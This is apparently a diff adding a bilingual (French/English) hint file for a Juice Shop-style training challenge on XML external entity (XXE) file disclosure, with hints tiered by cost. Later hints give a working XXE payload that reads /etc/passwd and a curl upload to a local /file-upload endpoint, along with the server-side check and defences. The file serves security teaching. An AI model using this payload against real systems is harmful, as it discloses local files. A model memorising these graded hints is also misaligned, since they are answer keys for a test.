@@ -1,0 +1,149 @@
+challenge_key: "xxeFileDisclosureChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP #1 : "leverage point is the
+      deprecated B2B interface". Pre-requis :
+      deprecatedInterfaceChallenge (XML
+      upload). Hint #3 : "research on typical
+      XXE patterns".
+    text_en: |
+      OWASP hint #1: "leverage point is the
+      deprecated B2B interface". Prerequisite:
+      deprecatedInterfaceChallenge (XML
+      upload). Hint #3: "research on typical
+      XXE patterns".
+    pedagogical_intent: |
+      Activate XXE reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      XXE basique : le XML autorise des
+      external entities qui pointent vers des
+      files locaux. Le parser lit le file et
+      l'inclus dans le response. Cible :
+      /etc/passwd (Linux) ou C:\Windows\
+      system.ini (Windows).
+    text_en: |
+      Basic XXE: XML allows external entities
+      pointing to local files. Parser reads
+      file and includes in response. Target:
+      /etc/passwd (Linux) or C:\Windows\
+      system.ini (Windows).
+    pedagogical_intent: |
+      Spell XXE concept.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Payload XXE classique : `<?xml version=
+      "1.0"?><!DOCTYPE foo [<!ENTITY xxe
+      SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>`. Save dans `xxe.xml`
+      puis upload via /file-upload.
+    text_en: |
+      Classic XXE payload: `<?xml version=
+      "1.0"?><!DOCTYPE foo [<!ENTITY xxe
+      SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>`. Save in `xxe.xml`
+      then upload via /file-upload.
+    pedagogical_intent: |
+      Reveal exact payload.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Source verifiee (routes/fileUpload.ts:
+      85) : `solveIf(() => utils.matches
+      EtcPasswdFile(xmlString) || utils.
+      matchesSystemIniFile(xmlString))`. Le
+      check verify que le content du XML
+      parsed CONTIENT du /etc/passwd ou
+      system.ini text. Donc le entity expand
+      doit reussir.
+    text_en: |
+      Verified source (routes/fileUpload.ts:
+      85): `solveIf(() =>
+      utils.matchesEtcPasswdFile(xmlString)
+      || utils.matchesSystemIniFile(xmlString))`.
+      Check verifies parsed XML content
+      CONTAINS /etc/passwd or system.ini
+      text. So entity expansion must
+      succeed.
+    pedagogical_intent: |
+      Reveal exact server check.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow :
+      1. Pre-requis :
+         deprecatedInterfaceChallenge
+         (XML upload accepted).
+      2. Crafter xxe.xml :
+         ```xml
+         <?xml version="1.0"?>
+         <!DOCTYPE foo [
+           <!ENTITY xxe SYSTEM
+             "file:///etc/passwd">
+         ]>
+         <foo>&xxe;</foo>
+         ```
+      3. Upload via curl :
+         ```bash
+         curl -X POST
+           http://localhost:3000/file-upload
+           -F "file=@xxe.xml"
+           -H "Authorization: Bearer <token>"
+         ```
+      4. Le serveur :
+         (a) handleXmlUpload accepte .xml
+         (b) libxml.parseXml avec noent:
+             true expand l'entity
+         (c) /etc/passwd content lu et
+             include dans le XML parsed
+         (d) matchesEtcPasswdFile match
+             -> challenge solve auto.
+      Source : routes/fileUpload.ts:75-100
+      + OWASP XXE Prevention.
+      Defense : disable DOCTYPE + noent:
+      false + modern safe parser + sandbox.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Workflow:
+      1. Prerequisite:
+         deprecatedInterfaceChallenge
+         (XML upload accepted).
+      2. Craft xxe.xml:
+         ```xml
+         <?xml version="1.0"?>
+         <!DOCTYPE foo [
+           <!ENTITY xxe SYSTEM
+             "file:///etc/passwd">
+         ]>
+         <foo>&xxe;</foo>
+         ```
+      3. Upload via curl:
+         ```bash
+         curl -X POST
+           http://localhost:3000/file-upload
+           -F "file=@xxe.xml"
+           -H "Authorization: Bearer <token>"
+         ```
+      4. Server:
+         (a) handleXmlUpload accepts .xml
+         (b) libxml.parseXml with noent:
+             true expands entity
+         (c) /etc/passwd content read and
+             included in parsed XML
+         (d) matchesEtcPasswdFile matches
+             -> challenge auto solves.
+      Source: routes/fileUpload.ts:75-100
+      + OWASP XXE Prevention.
+      Defense: disable DOCTYPE + noent:
+      false + modern safe parser + sandbox.
+    pedagogical_intent: |
+      Solution + payload + defense.
